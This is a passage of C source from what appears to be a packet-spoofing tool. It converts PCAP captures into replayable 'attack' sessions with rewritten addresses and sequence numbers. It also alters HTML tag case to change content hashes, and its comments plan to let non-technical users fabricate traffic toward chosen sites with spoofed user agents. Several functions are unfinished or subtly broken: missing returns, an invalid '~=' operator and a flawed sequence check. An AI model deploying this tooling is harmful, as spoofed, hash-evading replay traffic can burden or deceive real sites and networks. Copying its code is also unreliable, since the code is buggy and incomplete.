                        // a single connection
                        if (*instructions == iptr)
                            *instructions = inext;
                        else
                            ilast->next = inext;

                        // we dont want ths packet going to the next one as it arrived..
                        iptr->next = NULL;

                        // put to linked list in order
                        L_link_ordered((LINK **)&packets, (LINK *)iptr);

                        // RST + ACK = last packet.. in the millions of packets it was slow-er without this...
                        if ((iptr->flags & TCP_FLAG_FIN) && (iptr->flags & TCP_FLAG_ACK))
                            break;

                        // time to process the next
                        iptr = inext;
                        continue;
                    }
                }
            }

        // set this packet as the last.. so in future the connections can be unlinked from their original list
        ilast = iptr;

        // time to process the next
        iptr = iptr->next;
    }

    ret = packets;

/*    printf("-----------------\n");
    printf("done func %d client count %d filter count %d\n", count, ccount, fcount);
    printf("-----------------\n"); */
    return ret;
}




// Takes the single connection packet instructions from InstructionsFindConnection() and creates an attack structure
// around it so that it initializes an attack with its parameters
AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int count, int interval) {
    PacketBuildInstructions *iptr = instructions;
    AS_attacks *aptr = NULL;
    struct packet *p = NULL;
    AS_attacks *ret = NULL;
    int found_start = 0;
    PacketBuildInstructions *Packets[16];
    PacketBuildInstructions *pptr = NULL;
    int Current_Packet = 0;
    int found_seq = 0;
    int i = 0;

    // ensure that packet array if ZERO for later...
    memset((void *)&Packets, 0, sizeof(PacketBuildInstructions *) * 16);

    // allocate space for this new structure being built
    if ((aptr = (AS_attacks *)calloc(1,sizeof(AS_attacks))) == NULL) goto end;

    // set ids randomly.. aybe use ranges later..
    // from packet file names? or some other way...
    aptr->id = rand()%0xFFFFFFFF;

    // initialize and lock mutex for this new attack entry
    pthread_mutex_init(&aptr->pause_mutex, NULL);    
    pthread_mutex_lock(&aptr->pause_mutex);

    // this is used for awaiting GZIP compression attack
    aptr->paused = 1;

    // we can get more specific later..
    // esp when replaying DNS (UDP).. TCP4, ICMP and other protocols all together..
    aptr->type = ATTACK_SESSION;

    // set instructions list inside of the attack structure.. 
    aptr->packet_build_instructions = instructions;

    // we need to find a few things... base server/client seq
    // loop through them if we need something from there..    
    while (iptr != NULL) {
        if (!found_start) {
            // if its set as a client from the last function which created these structures, and its a SYN packet..
            // then its the first
            if (iptr->client && (iptr->flags & TCP_FLAG_SYN)) {
                aptr->src = iptr->source_ip;
                aptr->dst = iptr->destination_ip;
                aptr->source_port = iptr->source_port;
                iptr->destination_port = iptr->destination_port;
                
                aptr->destination_port = iptr->destination_port;
                aptr->source_port = iptr->source_port;

                aptr->dst = iptr->destination_ip;
                aptr->src = iptr->source_ip;
                
                found_start = 1;
            }
        }

        // maybe rewrite this later... i'd like to process more information about connections
        // but i do beieve this will work for now.
        if (!found_seq) {
            // SYN / ACK are good for finding the base seqs because it only gets incresed by 1
            if ((iptr->flags & TCP_FLAG_ACK) && !(iptr->flags & TCP_FLAG_SYN)) {
                // if this is an ACK but not a SYN.. its accepting the connection..
                // we want to find the other before it!
                pptr = Packets[(Current_Packet - 1) % 16];
                // scan at most prior 16 packets looking for ACK/SEQ
                for (i = 1; i < 15; i++) {
                    pptr = Packets[i % 16];
                    if (pptr != NULL) {
                        // be sure its the same connection
                        if ((pptr->source_ip == iptr->destination_ip))
                            // the packet before (SYN packet) should have an ACK of 0 since its new... and it has SYN flag
                            if ((pptr->ack == 0) && (iptr->flags & TCP_FLAG_SYN) & (iptr->flags & TCP_FLAG_ACK)) {
                                // this is the one where we get the clients base seq
                                aptr->client_base_seq = pptr->seq;

                                // and the current packet that we found (ACK'ing the SYN) is the server's base seq.
                                aptr->server_base_seq = iptr->ack;

                                found_seq = 1;
                                break;
                            }
                    }
                }
                
            }

            // future analysis go here.. using Packets array for packets before whichever

            // most temporary we hold is 16.. we just keep rotating using mod
            Packets[Current_Packet++ % 16] = iptr;
        }

        iptr = iptr->next;
    }

    //iptr->ts = time(0); // we dont set time so itll activate immediately..
    aptr->count = count;
    // lets repeat this connection once every 10 seconds
    aptr->repeat_interval = interval;

    // successful...
    ret = aptr;


    // lets initialize our adjustments so its different from the input
    PacketAdjustments(aptr);

    // unpause...
    aptr->paused = 0;
    
    // the calling function can handle putting it into the actual attack list..
    
    end:;

    if (aptr) pthread_mutex_unlock(&aptr->pause_mutex);

    // something happened before we successfully set the return  pointer.. free everything
    // we allocated
    if (!ret && aptr) {
        // this was passed to us.. so dont free it
        aptr->packet_build_instructions = NULL;

        // free any other structures that were created..
        AttackFreeStructures(aptr);

        PtrFree((char **)&aptr);
    }

    return ret;
}


/*
notes for using pcaps, etc....

someone can start wireshark, and browse a site that they want to add to the attack
if they used macros such as fabricated name, address.. orr other informatin
that could be automatically found, and modified then it would be the simplest
way to append more sessions for attacking

if put into a database.. it could have a list of sites
w management (IE: perform some basic actions using a browser addon
such as clearing things (cookies, etc, ,etc)) and then it can
prepare to spoof somme other useragents...

it would allow people who dont undertand technology to easily inisert 
new sites to fabricate transmissions towards

be sure to save as PCAP not PCAPNG
*/


// Loads a PCAP file looking for a particular destination port (for example, www/80)
// and sets some attack parameters after it completes the process of importing it
int PCAPtoAttack(char *filename, int dest_port, int count, int interval) {
    PacketInfo *packets = NULL;
    PacketBuildInstructions *packetinstructions = NULL;
    PacketBuildInstructions *final_instructions = NULL;
    FilterInformation flt;
    AS_attacks *aptr = NULL;
    AS_attacks *ret = NULL;
    int i = 1;
    int total = 0;
    //int start_ts = time(0);

    // load pcap file into packet information structures
    if ((packets = PcapLoad(filename)) == NULL) return 0;
    
    // turn those packet structures `into packet building instructions via analysis, etc
    if ((packetinstructions = PacketsToInstructions(packets)) == NULL) goto end;
        
    // prepare the filter for detination port
    FilterPrepare(&flt, FILTER_PACKET_FAMILIAR|FILTER_SERVER_PORT, dest_port);
    
    // loop and load as many of this type of connection as possible..
    while (i) {
        final_instructions = NULL;
        // find the connection for some last minute things required for building an attack
        // from the connection
        if ((final_instructions = InstructionsFindConnection(&packetinstructions, &flt)) == NULL) goto end;
    
        if (final_instructions == NULL) break;

        // create the attack structure w the most recent filtered packet building parameters
        if ((aptr = InstructionsToAttack(final_instructions, count, interval)) == NULL) goto end;

        // add to the attack list being executed now
        aptr->next = attack_list;
        attack_list = aptr;

        total++;
        //printf("\rTotal: %05d     \t\t", total);
    }
    
    // if it all worked out...
    ret = aptr;

    //printf("perfecto we generated an attack directly from a packet capture..\n%d count\n", total);
    end:;
    //printf("\r\nTime to load full file: %d\n", time(0) - start_ts);
    PacketsFree(&packets);
    PacketBuildInstructionsFree(&packetinstructions);

    if (ret == NULL)
        PacketBuildInstructionsFree(&final_instructions);

    return total;
}

/*
typedef struct _points { int x; int y; int n} MPoints;
CPoints[] = {
    {00,11,1},{01,22,2},{21,31,3},{31,42,4},{41,53,5},{55,54,6},{54,53,7},{05,15,8},{14,22,9},{03,15,10},{24,35,11},{00,00,00}
};

int pdiff(int x, int y) {
    int ret = 0;
    int i = 0, a = 0, z = 0;
    MPoints points[16];

    while (CPoints[i].n != 0) {
        points[i].x = CPoints[i].x - x;
        if (points[i].x < 0) points[i].x ~= points[i].x;
        points[i].y = CPoints[i].y - y;
        
        if (points[i].y < 0) points[i].y ~= points[i].y; 

        i++;
    }

    for (a = 0; CPoints[a].id != 0; a++) {

    }

    return ret;
}

[00,11],[01,22],[21,31],[31,42],[41,53],[55,54],[54,53],[05,15],[14,22],[03,15],[24,35],[00,00]

0                       1                                  2                         3                          4                              5





1                     11                                  21                        31                         41                              51







2                      12                                  22                        32                         42                            52






3                     13                                   23                         33                         43                           53





4                      14                                  24                       34                            44                           54





5                     15                                   25                        35                           45                           55



*/

// lets do small things to change content hashes...
int HTTPContentModification(char *data, int size) {
    int i = 0;
    int p = 0;
    float z = 0;
    char *tags_to_modify[] = {"<html>","<body>","<head>","<title>","</title>","</head>","</body>","</html>",NULL};
    char *sptr = NULL;
    int ret = 0;

    //return 0;
    if (data == NULL || size == 0) return ret;

    for (i = 0; i < size; i++)
        if (isprint(data[i]))
            p++;
    
    z = (p / size) * 100;

    // probably html/text since 95% is printable character...
    if (z < 95) return 0;

    for (i = 0; tags_to_modify[i] != NULL; i++) {
        if ((sptr = strcasestr(data, tags_to_modify[i])) != NULL) {
            for (z = 0; z < 3; z++) {
                p = rand()%strlen(tags_to_modify[i]);

                // at this character.. change case..
                if (isupper(sptr[p])) sptr[p] = tolower(sptr[p]);
                if (islower(sptr[p])) sptr[p] = toupper(sptr[p]);

                ret++;
            }
        }
    }

    return ret;
}




int BuildSingleUDP4Packet(PacketBuildInstructions *iptr) {
    int ret = -1;

    // this is only for ipv4 tcp
    if (iptr->type != PACKET_TYPE_UDP_4) return ret;

    // calculate full length of packet.. before we allocate memory for storage
    int final_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + iptr->data_size;
    unsigned char *final_packet = (unsigned char *)calloc(1, final_packet_size);
    struct packetudp4 *p = (struct packetudp4 *)final_packet;

    // ensure the final packet was allocated correctly
    if (final_packet == NULL) return ret;

    // IP header below
    p->ip.version       = 4;
    p->ip.ihl   	    = IPHSIZE >> 2;
    p->ip.tos   	    = 0;    
    p->ip.frag_off 	    = 0;
    p->ip.protocol 	    = IPPROTO_UDP;
    p->ip.tot_len       = htons(final_packet_size);

    //p->udp

}



int BuildSingleICMP4Packet(PacketBuildInstructions *iptr) {
    int ret = -1;

    // this is only for ipv4 tcp
    if (iptr->type != PACKET_TYPE_ICMP_4) return ret;

    /*
     //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
     
    //zero out the packet buffer
    memset (packet, 0, packet_size);
 
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
 
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    //checksum
    icmp->checksum = 0;
    */
}

/*
coming soon:
int BuildSingleTCP6Packet(PacketBuildInstructions *iptr);
int BuildSingleUDP6Packet(PacketBuildInstructions *iptr);
int BuildSingleICMP6Packet(PacketBuildInstructions *iptr);


need a sniffer which can use filters to find particular sessions
should have heuristics to find somme gzip http, dns, etc.. 

so the tool can get executed, and automatically populate & initiate
*/